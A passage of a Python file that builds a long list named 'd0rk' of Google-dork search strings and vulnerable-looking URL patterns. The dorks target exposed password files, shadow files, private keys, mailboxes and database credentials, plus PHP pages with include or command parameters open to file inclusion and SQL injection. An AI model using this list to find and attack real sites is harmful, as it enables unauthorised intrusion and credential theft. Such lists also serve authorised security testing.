         'extdoc|pdf|xls|txt|ps|rtf|odt|sxw|psw|ppt|pps|xmlintextconfidentialsalary|intextbudgetapprovedconfidential',
         'extensions/extlist.php?cat', 'extghogho', 'exticsics', 'extincpwdUID', 'extiniVersion4.0.0.4password',
         'extinieudora.ini', 'extiniintextenv.ini', 'extjbfjbf', 'extldifldif',
         'extlogSoftwareMicrosoftInternetInformation', 'extlogSoftwareMicrosoftInternetInformationServices.',
         'extmdb.mdbfpdbshop.mdb', 'extnsfnsfgovmil', 'extpasswdintextthesampleexample',
         'extplistfiletypeplistbookmarks.plist', 'extpqipqidatabase', 'extqipqidatabase', 'extregusernameputty',
         'exttxtFinalencryptionkey', 'exttxtdxdiag', 'exttxtunattend.txt', 'extvmdkvmdk', 'extvmxvmx',
         'extymldatabaseconfig', 'ezPublishadministration', 'faq.asp?cartID', 'faq.cfm?cartID', 'faq.php?',
         'faq.php?cartID', 'faq.php?id', 'faq.php?qid', 'faq/category.php?id', 'faq/question.php?Id', 'faq2.php?id',
         'faqlist.asp?id', 'faqlist.cfm?id', 'faqlist.php?id', 'faqs.asp?id', 'faqs.cfm?id', 'faqs.php?id',
         'fatcat/artistInfo.php?id', 'fatcat/home.asp?view', 'fatcat/home.php?view', 'faxsurvey', 'fcgibin/echo',
         'fcms/view.php?cid', 'feature.asp?id', 'feature.php?id', 'feature2.php?id', 'featuredetail.php?id',
         'features/view.php?id', 'feedback.asp?title', 'feedback.cfm?title', 'feedback.php?title', 'fellows.php?id',
         'ficha.php?id', 'fichespectacle.php?id', 'file', 'file.php?action', 'file.php?basepath', 'file.php?body',
         'file.php?channel', 'file.php?chapter', 'file.php?choix', 'file.php?cmd', 'file.php?cont', 'file.php?corpo',
         'file.php?disp', 'file.php?doshow', 'file.php?ev', 'file.php?eval', 'file.php?get', 'file.php?id',
         'file.php?inc', 'file.php?incl', 'file.php?include', 'file.php?index', 'file.php?ir', 'file.php?ki',
         'file.php?left', 'file.php?load', 'file.php?loader', 'file.php?middle', 'file.php?modo', 'file.php?n',
         'file.php?nivel', 'file.php?numero', 'file.php?oldal', 'file.php?pagina', 'file.php?param', 'file.php?pg',
         'file.php?play']
d0rk += ['file.php?pollname', 'file.php?pref', 'file.php?q', 'file.php?qry', 'file.php?ref', 'file.php?seccion',
         'file.php?second', 'file.php?showpage', 'file.php?sivu', 'file.php?sp', 'file.php?start', 'file.php?strona',
         'file.php?texto', 'file.php?to', 'file.php?type', 'file.php?url', 'file.php?var', 'file.php?viewpage',
         'file.php?where', 'file.php?y', 'fileinclude', 'filemail.pl', 'filemanager.php?delete', 'filename',
         'files.php?cat', 'files.pl', 'fileseek.cgi?head&foot', 'filetypeASPASP', 'filetypeASPXASPX', 'filetypeBMLBML',
         'filetypeCFMCFM', 'filetypeCGICGI', 'filetypeDIFFDIFF', 'filetypeDLLDLL', 'filetypeDOCDOC', 'filetypeFCGIFCGI',
         'filetypeHTMHTM', 'filetypeHTMLHTML', 'filetypeJHTMLJHTML', 'filetypeJSPJSP', 'filetypeMVMV', 'filetypePDFPDF',
         'filetypePHP3PHP3', 'filetypePHP4PHP4', 'filetypePHPPHP', 'filetypePHTMLPHTML', 'filetypePLPL',
         'filetypePPTPPT', 'filetypePSps', 'filetypeQBWqbw', 'filetypeSHTMLSHTML', 'filetypeSTMSTM', 'filetypeSWFSWF',
         'filetypeTXTTXT', 'filetypeXLSXLS', 'filetypeaspCustomErrorMessageCategorySource',
         'filetypeaspDBQServer.MapPath.mdb', 'filetypeasp[ODBCSQL', 'filetypebak\htaccess|passwd|shadow|htusers',
         'filetypebakcreateobjectsa', 'filetypebakhtaccess|passwd|shadow|htusers', 'filetypebkfbkf',
         'filetypebltbltintextscreenname', 'filetypebltbuddylist', 'filetypecfgautoinst.cfg',
         'filetypecfgksintextrootpwsampletesthowto', 'filetypecfgmrtgtarget', 'filetypecfmcfapplicationnamepassword',
         'filetypecgiWebStore.cgi', 'filetypecgifileman.cgi', 'filetypecnfvtipvtaccess.cnf', 'filetypeconffirewallcvs',
         'filetypeconfigconfigintextappSettingsUserID', 'filetypeconfigweb.configCVS', 'filetypeconfoekakibbs',
         'filetypeconfproftpd.PROFTPFTPserverconfigurationfilereveals', 'filetypeconfpsybnc.confUSER.PASS',
         'filetypeconfslapd.conf', 'filetypectlhaccess.MicrosoftFrontPageequivalentofhtaccess', 'filetypecttContact',
         'filetypecttcttmessenger', 'filetypedatSites.dat', 'filetypedatpassword.dat', 'filetypedatwand.dat',
         'filetypedbpdbbackupPilot|Pluckerdb', 'filetypeemlemlintextSubjectintextFromintextTo', 'filetypefp3fp3',
         'filetypefp5fp5sitegovsitemilcvslog', 'filetypefp7fp7', 'filetypehpindexinurlhpicalendarsitesourceforge.net',
         'filetypeincdbconn', 'filetypeincintextmysqlconnect', 'filetypeincmysqlconnectORmysqlpconnect',
         'filetypeinfcapolicy.inf', 'filetypeinfsysprep', 'filetypeiniServUDaemon', 'filetypeiniflashFXP.ini',
         'filetypeiniservu.ini', 'filetypeiniwcxftp', 'filetypeiniwsftppwd', 'filetypeldbadmin',
         'filetypeliclicintextkey', 'filetypelogPHPParseerror|PHPWarning|PHPError', 'filetypelogSee`ipseccopyright',
         'filetypelogaccess.logCVS', 'filetypelogcron.log', 'filetypelogintextConnectionManager2',
         'filetypelogintextConnectionManager2?', 'filetypelogpassword.log',
         'filetypelogusernameputtyPUTTYSSHclientlogscanrevealusernames',
         'filetypemail|filetypeeml|filetypembox|filetypembxintextassword|subject',
         'filetypemail|filetypeeml|filetypembox|filetypembxintextpassword|subject', 'filetypembxmbxintextSubject',
         'filetypemdbprofilesMicrosoftAccessdatabasescontaininguser', 'filetypemdbusers.mdb', 'filetypemdbwwforum',
         'filetypemydmydCVS', 'filetypenetrcpassword', 'filetypens1ns1', 'filetypeoraora', 'filetypeoratnsnames',
         'filetypeotjohn.pot', 'filetypepasspassintextuserid', 'filetypepdbpdbbackupPilot|Pluckerdb',
         'filetypepdfAssessmentReportnessus', 'filetypepemintextprivate',
         'filetypephpindexphpicalendarsitesourceforge.net', 'filetypephpipinfo.phpDistributedIntrusionDetectionSystem',
         'filetypephplogging.phpDiscuzerror', 'filetypephpnqtintextNetworkQueryTool', 'filetypephpvAuthenticate',
         'filetypephpwebeditor.php', 'filetypeplDownloadSuSELinuxOpenexchangeServerCA', 'filetypeplUltraboardSetup',
         'filetypepotjohn.pot', 'filetypepropertiesdbintextpassword', 'filetypepstoutlook.pst',
         'filetypepstpstfromtodate', 'filetypepwdservice', 'filetypepwlpwl', 'filetypeqbbqbb', 'filetyper2wr2w',
         'filetyperaora', 'filetyperaorafiletypedbpdbbackupPilot|Pluckerdb', 'filetyperdprdp',
         'filetyperdprdpRemoteDesktopConnectionfilesrevealuser', 'filetyperegTerminalServerClient',
         'filetyperegregHKEYCURRENTUSERSSHHOSTKEYS', 'filetyperegregHKEYWindowsRegistryexportscanreveal',
         'filetyperegregintext?WINVNC3?', 'filetyperegregintextMicrosoftInternetAccountManagercan',
         'filetyperegregintextdefaultusernameintextdefaultpassword', 'filetyperegregintext??WINVNC3??',
         'filetypesqlIDENTIFIEDBYcvs', 'filetypesqlinsertintopass|passwd|password', 'filetypesqlpassword',
         'filetypesqlvaluesMD5|valuespassword|valuesencrypt', 'filetypesqlvaluesMD5?|valuespassword|valuesencrypt',
         'filetypestoutlook.pst', 'filetypestpstfromtodate', 'filetypeurlftp//;', 'filetypevcsvcs',
         'filetypevsdvsdnetworksamplesexamples', 'filetypewabwab', 'filetypewabwabMicrosoftOutlookExpressMailaddress',
         'filetypexlsemail.xls', 'filetypexlssitegovcontact', 'filetypexlsusernamepasswordemail', 'filezilla.xmlcvs',
         'films.php?id', 'finalrevdisplay.php?id', 'finger', 'firmid', 'fitxa.php?id', 'folder.php?id',
         'fonts/details.php?id', 'footer.inc.php', 'formmail.cgi', 'forum', 'forum.php?act', 'forum.php?seitephp?seite',
         'forum/index.php?topic', 'forum/profile.asp?id', 'forum/profile.php?id']
d0rk += ['forum/showProfile.asp?id', 'forum/showProfile.php?id', 'forum/showthread.php?p', 'forum/showthread.php?t',
         'forum/viewtopic.php?TopicID', 'forum/viewtopic.php?id', 'forum/viewtopic.php?t',
         'forumapc/plantfinder/details.php?id', 'forumbds.php?num', 'forumfiletypemdb', 'forums/index.php?page',
         'forums/index.php?topic', 'forums/search.php?do', 'forums/showthread.php?t', 'forwardfiletypeforwardcvs',
         'fpcount.exe', 'fr/commandelistecategorie.asp?panier', 'fr/commandelistecategorie.php?panier',
         'frag.php?execfrag.php', 'frag.php?execfrag.php?exec', 'frag.php?execphp?exec', 'frame.php?locphp?loc',
         'franchise2.php?id', 'freeboard/boardview.html?page', 'freedownload.asp?bookid', 'freedownload.cfm?bookid',
         'freedownload.php?bookid', 'freerelease.php?id', 'frf10/news.php?id', 'front/bin/forumview.phtml?bbcode',
         'frontend/category.asp?idcategory', 'frontend/category.php?idcategory', 'fshstatistic/index.asp?PID',
         'fshstatistic/index.php?&PID', 'fshstatistic/index.php?PID', 'eastgame.net', 'fullDisplay.asp?item',
         'fullDisplay.cfm?item', 'fullDisplay.php?item', 'functions.php?prefix', 'galerie.asp?cid', 'galerie.php?cid',
         'galerie.php?dophp?do', 'galeriinfo.php?l', 'gallery.asp?id', 'gallery.php?[]', 'gallery.php?abre',
         'gallery.php?action', 'gallery.php?addr', 'gallery.php?basedir', 'gallery.php?basepath', 'gallery.php?chapter',
         'gallery.php?cont', 'gallery.php?corpo', 'gallery.php?disp', 'gallery.php?ev', 'gallery.php?eval',
         'gallery.php?filepath', 'gallery.php?get', 'gallery.php?go', 'gallery.php?h', 'gallery.php?id',
         'gallery.php?index', 'gallery.php?itemnav', 'gallery.php?ki', 'gallery.php?left', 'gallery.php?loader',
         'gallery.php?menu', 'gallery.php?menue', 'gallery.php?mid', 'gallery.php?mod', 'gallery.php?module',
         'gallery.php?my', 'gallery.php?name', 'gallery.php?nivel', 'gallery.php?oldal', 'gallery.php?open',
         'gallery.php?option', 'gallery.php?pag', 'gallery.php?page', 'gallery.php?pageweb', 'gallery.php?panel',
         'gallery.php?param', 'gallery.php?pg', 'gallery.php?phpbbrootpath', 'gallery.php?pname',
         'gallery.php?pollname', 'gallery.php?pre', 'gallery.php?pref', 'gallery.php?qry', 'gallery.php?redirect',
         'gallery.php?ref', 'gallery.php?rub', 'gallery.php?sec', 'gallery.php?secao', 'gallery.php?seccion',
         'gallery.php?seite', 'gallery.php?showpage', 'gallery.php?sivu', 'gallery.php?sp', 'gallery.php?strona',
         'gallery.php?thispage', 'gallery.php?tipo', 'gallery.php?to', 'gallery.php?url', 'gallery.php?var',
         'gallery.php?viewpage', 'gallery.php?where', 'gallery.php?xlink', 'gallery.php?y',
         'gallery/categoria.php?idcat', 'gallery/detail.asp?ID', 'gallery/detail.php?ID', 'gallery/gallery.asp?id',
         'gallery/gallery.php?id', 'gallery/mailmanager/subscribe.php?ID', 'gallerysort.asp?iid', 'gallerysort.php?iid',
         'game.php?id', 'games.php?id', 'games/index.php?task', 'games/play.php?id',
         'gardenequipment/FruitCage/product.asp?pr', 'gardenequipment/FruitCage/product.php?pr',
         'gardenequipment/pestweedcontrol/product.asp?pr', 'gardenequipment/pestweedcontrol/product.php?pr',
         'gb/comment.asp?gbid', 'gb/comment.php?gbid', 'general.asp?id', 'general.php?abre', 'general.php?addr',
         'general.php?adresa', 'general.php?b', 'general.php?basedir', 'general.php?body', 'general.php?channel',
         'general.php?chapter', 'general.php?choix', 'general.php?cmd', 'general.php?content', 'general.php?doshow',
         'general.php?e', 'general.php?f', 'general.php?get', 'general.php?goto', 'general.php?header',
         'general.php?id', 'general.php?inc', 'general.php?include', 'general.php?ir', 'general.php?itemnav',
         'general.php?left', 'general.php?link', 'general.php?menu', 'general.php?menue', 'general.php?mid',
         'general.php?middle', 'general.php?modo', 'general.php?module', 'general.php?my', 'general.php?name',
         'general.php?nivel', 'general.php?opcion', 'general.php?p', 'general.php?page', 'general.php?pageweb',
         'general.php?pollname', 'general.php?pr', 'general.php?pre', 'general.php?qry', 'general.php?read',
         'general.php?redirect', 'general.php?ref', 'general.php?rub', 'general.php?secao', 'general.php?seccion',
         'general.php?second', 'general.php?section', 'general.php?seite', 'general.php?sekce', 'general.php?sivu',
         'general.php?strona', 'general.php?subject', 'general.php?texto', 'general.php?thispage', 'general.php?tipo',
         'general.php?to', 'general.php?type', 'general.php?var', 'general.php?w', 'general.php?where',
         'general.php?xlink', 'general/blogpost/?p', 'generatedby', 'gery.php?', 'gery.php?[]', 'gery.php?abre',
         'gery.php?action', 'gery.php?addr', 'gery.php?basedir', 'gery.php?basepath', 'gery.php?chapter',
         'gery.php?cont', 'gery.php?corpo', 'gery.php?disp', 'gery.php?ev', 'gery.php?eval', 'gery.php?filepath',
         'gery.php?get', 'gery.php?go', 'gery.php?h', 'gery.php?id', 'gery.php?index', 'gery.php?itemnav',
         'gery.php?ki', 'gery.php?left', 'gery.php?loader', 'gery.php?menu', 'gery.php?menue', 'gery.php?mid',
         'gery.php?mod', 'gery.php?module', 'gery.php?my', 'gery.php?name', 'gery.php?nivel', 'gery.php?oldal',
         'gery.php?open', 'gery.php?option', 'gery.php?pag', 'gery.php?page', 'gery.php?pageweb', 'gery.php?panel',
         'gery.php?param', 'gery.php?pg']
d0rk += ['gery.php?phpbbrootpath', 'gery.php?pname', 'gery.php?pollname', 'gery.php?pre', 'gery.php?pref',
         'gery.php?qry', 'gery.php?redirect', 'gery.php?ref', 'gery.php?rub', 'gery.php?sec', 'gery.php?secao',
         'gery.php?seccion', 'gery.php?seite', 'gery.php?showpage', 'gery.php?sivu', 'gery.php?sp', 'gery.php?strona',
         'gery.php?thispage', 'gery.php?tipo', 'gery.php?to', 'gery.php?url', 'gery.php?var', 'gery.php?viewpage',
         'gery.php?where', 'gery.php?xlink', 'gery.php?y', 'gery/init.php?HTTPPOSTVARS', 'getFile.cfm',
         'getbook.asp?bookid', 'getbook.cfm?bookid', 'getbook.php?bookid', 'getdata', 'getmsg.htmlhotmail',
         'giftDetail.asp?id', 'giftDetail.cfm?id', 'giftDetail.php?id', 'giftshop/product.php?proid', 'gig.asp?id',
         'gig.php?id', 'glimpse', 'global.cgi', 'global.inc', 'global/product/product.asp?gubun',
         'global/product/product.php?gubun', 'globalprojects.asp?cid', 'globalprojects.php?cid',
         'glossary.php?termphp?term', 'gnatsweb.pl', 'gnu/?doc', 'goboard/front/boardview.asp?code',
         'goboard/front/boardview.php?code', 'goodsdetail.asp?data', 'goodsdetail.php?data', 'goodsdetail.php?goodsIdx',
         'googlekietu/hitjs.phpallkietu/hitjs.php', 'goto.php?areaid', 'grademade/index.php?page', 'gs/adminlogin.aspx',
         'guestbook.cgi', 'guestbook.pl', 'h.php?file', 'h.php?page', 'h4kurd/showthread.php?tid',
         'haccess.ctlVERYreliable', 'haccess.ctloneway', 'hall.php?file', 'hall.php?page', 'handler',
         'handlinger.php?visphp?vis', 'head.php?', 'head.php?[]', 'head.php?abre', 'head.php?adresa', 'head.php?b',
         'head.php?basedir', 'head.php?c', 'head.php?choix', 'head.php?cmd', 'head.php?content', 'head.php?corpo',
         'head.php?d', 'head.php?dir', 'head.php?disp', 'head.php?ev', 'head.php?filepath', 'head.php?g',
         'head.php?goto', 'head.php?inc', 'head.php?incl', 'head.php?include', 'head.php?index', 'head.php?ir',
         'head.php?ki', 'head.php?lang', 'head.php?left', 'head.php?load', 'head.php?loader', 'head.php?loc',
         'head.php?middle', 'head.php?middlePart', 'head.php?mod', 'head.php?modo', 'head.php?module',
         'head.php?numero', 'head.php?oldal', 'head.php?opcion', 'head.php?pag', 'head.php?pageweb', 'head.php?play',
         'head.php?pname', 'head.php?pollname', 'head.php?read', 'head.php?ref', 'head.php?rub', 'head.php?sec',
         'head.php?sekce', 'head.php?sivu', 'head.php?start', 'head.php?str', 'head.php?strona', 'head.php?tipo',
         'head.php?viewpage', 'head.php?where', 'head.php?y', 'header.php?systempath',
         'hearstjournalism/pressrelease.php?id', 'hello.bat', 'help.asp?CartId', 'help.cfm?CartId', 'help.cgi',
         'help.php?CartId', 'help.php?csspath', 'help/comview.html?code', 'historialeer.php?num',
         'historical/stock.php?symbol', 'history/index.php?id', 'hm/inside.asp?id', 'hm/inside.php?id',
         'holidays/dest/offers/offers.php?id', 'home', 'home.asp?cat', 'home.asp?id', 'home.cfm?id', 'home.php?a',
         'home.php?acthome.php?act', 'home.php?action', 'home.php?addr', 'home.php?ahome.php?a', 'home.php?aphp?a',
         'home.php?argphp?arg', 'home.php?basedir', 'home.php?basepath', 'home.php?body', 'home.php?cat',
         'home.php?category', 'home.php?channel', 'home.php?chapter', 'home.php?choix', 'home.php?cmd',
         'home.php?content', 'home.php?disp', 'home.php?doshow', 'home.php?e', 'home.php?ev', 'home.php?eval',
         'home.php?funcphp?func', 'home.php?g', 'home.php?h', 'home.php?id', 'home.php?ihome.php?i', 'home.php?in',
         'home.php?inchome.php?inc', 'home.php?include', 'home.php?index', 'home.php?ir', 'home.php?itemnav',
         'home.php?k', 'home.php?link', 'home.php?lnphp?ln', 'home.php?loader', 'home.php?loc', 'home.php?ltrphp?ltr',
         'home.php?menu', 'home.php?middle', 'home.php?middlePart', 'home.php?module', 'home.php?my', 'home.php?oldal',
         'home.php?opcion', 'home.php?pa', 'home.php?pag/home.php?pagphp', 'home.php?page', 'home.php?pageweb',
         'home.php?pagina', 'home.php?panel', 'home.php?path', 'home.php?play', 'home.php?pollname', 'home.php?pr',
         'home.php?pre', 'home.php?qry', 'home.php?read', 'home.php?recipe', 'home.php?redirect', 'home.php?ref',
         'home.php?rub', 'home.php?sec', 'home.php?secao', 'home.php?section', 'home.php?seite', 'home.php?sekce',
         'home.php?showpage', 'home.php?sitphp?sit', 'home.php?sp', 'home.php?str', 'home.php?tablephp?table',
         'home.php?thispage', 'home.php?tipo', 'home.php?w', 'home.php?where', 'home.php?x', 'home.php?z',
         'home1.php?lnphp?ln', 'home2.php?lnphp?ln', 'homepage.php?sel', 'hostinginfo.php?id',
         'hp/device/this.LCDispatcher', 'hpinfoPHPVersion', 'ht//Dightsearcherror', 'htgrep', 'htimage.exe',
         'htm/itemcat.php?itemid', 'html', 'html/101artistInfo.php?id', 'html/affich.php?base', 'html/gallery.php?id',
         'html/home/products/product.php?pid', 'html/print.asp?sid', 'html/print.php?sid', 'html/products.php?id',
         'html/productscat.php?catid', 'html/projdetail.php?id', 'html/scoutnew.asp?prodid', 'html/scoutnew.php?prodid',
         'htmlallowedguestbook', 'htmlpage.asp?id', 'htmlpage.php?id', 'htmlscript', 'htmltonuke.php?filnavn',
         'htm|html|phpindexoflastmodifiedparentdirectorydescriptionsize.txt|.doc|.pdf', 'htpasswd', 'htpasswd/htgroup',
         'htpasswd/htpasswd.bak', 'htpasswdfiletypehtpasswd', 'htsearch', 'http//domainname', 'humor.php?id',
         'hwreviews.php?id', 'iCONECT4.1Login']
d0rk += ['iDevAffiliateadmindemo', 'iVISTA.Main.Page', 'iam/tabbedWithShowcase.php?pid', 'ibp.asp?ISBN', 'ibp.php?ISBN',
         'id&intextWarningUnknown', 'id&intextWarningarraymerge', 'id&intextWarningfilesize',
         'id&intextWarninggetimagesize', 'id&intextWarningilesize', 'id&intextWarningiswritable',
         'id&intextWarningmysqlfetcharray', 'id&intextWarningmysqlfetchassoc', 'id&intextWarningmysqlnumrows',
         'id&intextWarningmysqlquery', 'id&intextWarningmysqlresult', 'id&intextWarningpgexec',
         'id&intextWarningpregmatch', 'id&intextWarningrequire', 'id&intextWarningsessionstart', 'idd',
         'ideabox/include.php?gorumDir', 'idlechat/message.asp?id', 'idlechat/message.php?id', 'ids5web',
         'ifgraphPagegeneratedatORThispagewasbuiltusingifgraph', 'ihm.php?p', 'iisadmin', 'iknow/content.asp?page',
         'iknow/content.php?page', 'iletypelogcron.log', 'ilohamailintextVersion0.8.10',
         'ilohamailintextVersion0.8.10?', 'im/im.cgi?p', 'im/im.cgi?pvote.pl?actionshow&id',
         'image.php?imgimage.php?img', 'image.php?imgphp?img', 'imagemap.exe', 'images/evil.php?ownede107',
         'img.php?locimg.php?loc', 'img.php?locphp?loc', 'impex/ImpExData.php?systempath',
         'impex/ImpExData.php?systempathintextpoweredbyvbulletin', 'impex/ImpExData.php?systempathpoweredbyvbulletin',
         'impex/ImpExData.php?systempathvbulletin', 'inc', 'inc.php?addr', 'inc.php?adresa', 'inc.php?basedir',
         'inc.php?body', 'inc.php?c', 'inc.php?category', 'inc.php?doshow', 'inc.php?ev', 'inc.php?get', 'inc.php?i',
         'inc.php?inc', 'inc.php?incl', 'inc.php?include', 'inc.php?incphp?inc', 'inc.php?j', 'inc.php?k', 'inc.php?ki',
         'inc.php?left', 'inc.php?link', 'inc.php?m', 'inc.php?menu', 'inc.php?modo', 'inc.php?open', 'inc.php?pg',
         'inc.php?rub', 'inc.php?showpage', 'inc.php?sivu', 'inc.php?start', 'inc.php?str', 'inc.php?to',
         'inc.php?type', 'inc.php?y', 'inc.vpn3000concentrator',
         'inc.vpn3000concentratorasterisk.management.portalwebaccess', 'inc/cmses/aedating4CMS.php?dir[inc]',
         'inc/cmses/aedating4CMS.php?dir[inc]flashchatsitebrbpncom.php?bnrep', 'inc/cmses/aedatingCMS.php?dir[inc]',
         'inc/cmses/aedatingCMS.php?dir[inc]flashchat', 'inc/functions.inc.php?config[pparootpath]',
         'inc/functions.inc.php?config[pparootpath]IndexAlbumsindex.php',
         'inc/functions.inc.php?config[pparootpath]IndexAlbumsindex.php/components/comcpg/cpg.php?mosConfigabsolutepathcomcpg[ScriptPath]/admin/index.php?oadmin/index.php;',
         'inc/header.php/stepone.php?serverinc', 'inc/pipe.php?HCLpath', 'inc/session.php?sessionerror0&langinc',
         'inc/steponetables.php?serverinc', 'incfile', 'incl', 'include.php?', 'include.php?[]', 'include.php?adresa',
         'include.php?b', 'include.php?basepath', 'include.php?channel', 'include.php?chapter', 'include.php?cmd',
         'include.php?cont', 'include.php?content', 'include.php?corpo', 'include.php?destino', 'include.php?dir',
         'include.php?eval', 'include.php?filepath', 'include.php?go', 'include.php?goFile', 'include.php?gorumDir',
         'include.php?goto', 'include.php?header', 'include.php?in', 'include.php?include', 'include.php?index',
         'include.php?ir', 'include.php?ki', 'include.php?left', 'include.php?loader', 'include.php?loc',
         'include.php?mid', 'include.php?middle', 'include.php?middlePart', 'include.php?module', 'include.php?my',
         'include.php?name', 'include.php?nivel', 'include.php?numero', 'include.php?oldal', 'include.php?option',
         'include.php?pag', 'include.php?pageweb', 'include.php?panel', 'include.php?path', 'include.php?phpbbrootpath',
         'include.php?play', 'include.php?read', 'include.php?redirect', 'include.php?ref', 'include.php?sec',
         'include.php?secao', 'include.php?seccion', 'include.php?second', 'include.php?sivu', 'include.php?tipo',
         'include.php?to', 'include.php?u', 'include.php?url', 'include.php?w', 'include.php?x',
         'include/editfunc.inc.php?NWCONFSYSTEM[serverpath]',
         'include/editfunc.inc.php?NWCONFSYSTEM[serverpath]Newswriter',
         'include/editfunc.inc.php?NWCONFSYSTEM[serverpath]site.gr', 'include/newvisitor',
         'include/newvisitor.inc.php?lvcincludedir', 'include/newvisitoradd.asp?bookid', 'include/write.php?dir',
         'includefile', 'includepath', 'includes/functions.php?phpbbrootpath', 'includes/header.php?systempath',
         'includes/search.php?GlobalSettings[templatesDirectory]', 'includes/topten/displayreview.php?id',
         'indepth/details.php?id', 'index.asp/en/component/pvm/?view', 'index.asp?ID', 'index.asp?action',
         'index.asp?areaid', 'index.asp?book', 'index.asp?cPath', 'index.asp?cart', 'index.asp?cartID', 'index.asp?cat',
         'index.asp?cid', 'index.asp?i', 'index.asp?lang', 'index.asp?modus', 'index.asp?news', 'index.asp?offs',
         'index.asp?option', 'index.asp?page', 'index.asp?pageid', 'index.asp?pagina', 'index.asp?pgt', 'index.asp?pid',
         'index.asp?section', 'index.asp?site', 'index.asp?t', 'index.asp?url', 'index.asp?w', 'index.cfm',
         'index.cfm?ID', 'index.cfm?cart', 'index.cfm?cartID', 'index.html.bak', 'index.html~', 'index.jsp',
         'index.of.bashhistoryUNIXbashshellhistoryrevealscommands', 'index.of.diz.nfolastmodified', 'index.of.etc',
         'index.of.shhistoryUNIXshellhistoryrevealscommandstypedat', 'index.ofApacheserverat',
         'index.ofadministrators.pwd', 'index.ofadminnews.aspconfigview.asp', 'index.ofcgiirc.config']
d0rk += ['index.ofcleanup.log', 'index.ofdead.letter', 'index.ofhaccess.ctl', 'index.ofinbox', 'index.ofinboxdbx',
         'index.ofintextsecring.skr|secring.pgp|secring.bak', 'index.ofmaster.passwd', 'index.ofpasslist',
         'index.ofpasswdpasswd.bak', 'index.ofpeople.lst', 'index.ofperform.inimIRCIRCinifilecanlistIRCusernamesand',
         'index.oftrillian.ini', 'index.ofwsftp.ini', 'index.php.bak', 'index.php/en/component/pvm/?view',
         'index.php3?actindex.php3?act', 'index.php3?actphp3?act', 'index.php3?filephp3?f', 'index.php3?filephp3?file',
         'index.php3?idindex.php3?id', 'index.php3?iindex.php3?i', 'index.php3?langindex.php3?lang',
         'index.php3?lindex.php3?l', 'index.php3?pageindex.php3?page', 'index.php3?pagindex.php3?pag',
         'index.php3?pgindex.php3?pg', 'index.php3?pindex.php3?p', 'index.php3?pindex.php3?pag',
         'index.php3?pindex.php3?page', 'index.php3?pindex.php3?pg', 'index.php3?sindex.php3?s', 'index.php3?sphp3?s',
         'index.php4?langindex.php4?lang', 'index.php4?langphp4?lang', 'index.php5?langindex.php5?lang',
         'index.php5?langphp5?lang', 'index.php?', 'index.php?Language',
         'index.php?REQUEST&REQUEST%5boption%5dcomcontent&REQUEST%5bItemid%5d1&GLOBALS&mosConfigabsolutepath',
         'index.php?RPPATH', 'index.php?RPPATHreviewpost', 'index.php?a', 'index.php?acao',
         'index.php?acaoindex.php?acao', 'index.php?acaophp?acao', 'index.php?act', 'index.php?actindex.php?act',
         'index.php?action', 'index.php?actionindex.php?action', 'index.php?actionphp?action', 'index.php?addr',
         'index.php?adresa', 'index.php?aindex.php?a', 'index.php?aphp?a', 'index.php?areaid',
         'index.php?argindex.php?arg', 'index.php?argphp?arg', 'index.php?arq', 'index.php?arqindex.php?arq',
         'index.php?arqphp?arq', 'index.php?arquivo', 'index.php?arquivophp?arquivo', 'index.php?b',
         'index.php?baindex.php?ba', 'index.php?basedir', 'index.php?basepath', 'index.php?basindex.php?bas',
         'index.php?basphp?bas', 'index.php?bindex.php?b', 'index.php?body', 'index.php?bodyindex.php?body',
         'index.php?book', 'index.php?c', 'index.php?cPath', 'index.php?cal', 'index.php?calindex.php?cal',
         'index.php?calphp?cal', 'index.php?canal', 'index.php?cart', 'index.php?cartID', 'index.php?cat',
         'index.php?catid', 'index.php?channel', 'index.php?chapter', 'index.php?cid', 'index.php?cindex.php?c',
         'index.php?cmd', 'index.php?coment', 'index.php?commandindex.php?command', 'index.php?commandphp?command',
         'index.php?configFile', 'index.php?cont', 'index.php?content', 'index.php?contentindex.php?content',
         'index.php?contentphp?content', 'index.php?conteudo', 'index.php?cphp?c', 'index.php?d', 'index.php?d1php?d1',
         'index.php?defindex.php?def', 'index.php?defphp?def', 'index.php?dept', 'index.php?dir',
         'index.php?directfile', 'index.php?disp', 'index.php?do', 'index.php?doc', 'index.php?document',
         'index.php?dokindex.php?dok', 'index.php?dokphp?dok', 'index.php?dsp', 'index.php?e', 'index.php?eindex.php?e',
         'index.php?ev', 'index.php?execindex.php?exec', 'index.php?execphp?exec', 'index.php?f', 'index.php?f1php?f1',
         'index.php?fPageindex.php?fPage', 'index.php?fPagephp?fPage', 'index.php?faseindex.php?fase',
         'index.php?fasephp?fase', 'index.php?file', 'index.php?fileindex.php?file', 'index.php?filename',
         'index.php?filepath', 'index.php?findex.php?f', 'index.php?fnindex.php?fn', 'index.php?fnphp?fn',
         'index.php?fsetphp?fset', 'index.php?funcion', 'index.php?funcphp?func',
         'index.php?functioncustom&customcustom', 'index.php?g', 'index.php?go', 'index.php?go1index.php?go1',
         'index.php?goindex.php?go', 'index.php?gorumdir', 'index.php?goto', 'index.php?gotoindex.php?goto',
         'index.php?gotophp?goto', 'index.php?h', 'index.php?hl', 'index.php?i', 'index.php?id&langindex.php?id',
         'index.php?id&langphp?id', 'index.php?id1&langindex.php?i', 'index.php?id1&langindex.php?id',
         'index.php?id1&langphp?id', 'index.php?idcat', 'index.php?idindex.php?id', 'index.php?inc', 'index.php?incl',
         'index.php?include', 'index.php?incphp?inc', 'index.php?index', 'index.php?inhalt', 'index.php?ir',
         'index.php?irphp?ir', 'index.php?j', 'index.php?k', 'index.php?kobr', 'index.php?l',
         'index.php?lang&pageindex.php?lang', 'index.php?lang&pagephp?lang', 'index.php?lang', 'index.php?langc',
         'index.php?langen&pageindex.php?lang', 'index.php?langen&pagephp?lang', 'index.php?langgr&file',
         'index.php?langindex.php?lang', 'index.php?lg', 'index.php?lgindex.php?lg', 'index.php?link', 'index.php?list',
         'index.php?lkphp?lk', 'index.php?ll', 'index.php?lng./../include/main.inc&GPATH', 'index.php?lngindex.php?lng',
         'index.php?lnindex.php?ln', 'index.php?lnk', 'index.php?lnkindex.php?lnk', 'index.php?lnkphp?lnk',
         'index.php?lnphp?ln', 'index.php?load', 'index.php?loc', 'index.php?locaindex.php?loca',
         'index.php?locaphp?loca', 'index.php?ltrindex.php?ltr', 'index.php?ltrphp?ltr', 'index.php?lv1', 'index.php?m',
         'index.php?main', 'index.php?mainphp?main', 'index.php?meio', 'index.php?meio.php',
         'index.php?meioindex.php?meio', 'index.php?meiophp?meio', 'index.php?menu', 'index.php?menudeti&page',
         'index.php?menudeti&pageindex.php?menudeti&page', 'index.php?mfindex.php?mf', 'index.php?mfphp?mf',
